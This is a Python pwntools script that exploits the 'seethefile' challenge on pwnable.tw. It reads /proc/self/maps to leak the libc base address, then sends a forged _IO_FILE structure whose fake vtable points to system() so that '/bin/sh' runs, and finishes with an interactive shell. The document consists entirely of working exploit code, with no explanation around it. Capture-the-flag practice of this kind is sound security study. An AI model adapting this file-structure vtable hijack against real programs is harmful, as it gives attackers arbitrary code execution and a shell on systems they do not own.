#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./seethefile"
elf=ELF(pwn_file)
#libc=ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc=ELF("./libc_32.so.6")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10200)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def fopen(name):
    r.sendlineafter("choice :", '1')
    r.sendlineafter("see :", name)

def read():
    r.sendlineafter("choice :", '2')

def write():
    r.sendlineafter("choice :", '3')

def close():
    r.sendlineafter("choice :", '4')

def exit(name):
    r.sendlineafter("choice :", '5')
    r.sendlineafter("name :", name)

debug()

fopen("/proc/self/maps")
read()
write()
read()
write()
r.recvline()
a = int(r.recv(8),16)
info("libc: "+hex(a))
libc.address = a

sh = '\x00'*0x20 + p32(0x804b284)
sh += "/bin/sh\x00" + p32(0)*16                 # _IO_FILE
sh += p32(0x804b260)                            # lock
sh += p32(0)*18
sh += p32(0x804b31c)                            # vtable addr

sh += p32(0)*17 + p32(libc.sym['system'])       # fake vtable
exit(sh)

r.interactive()
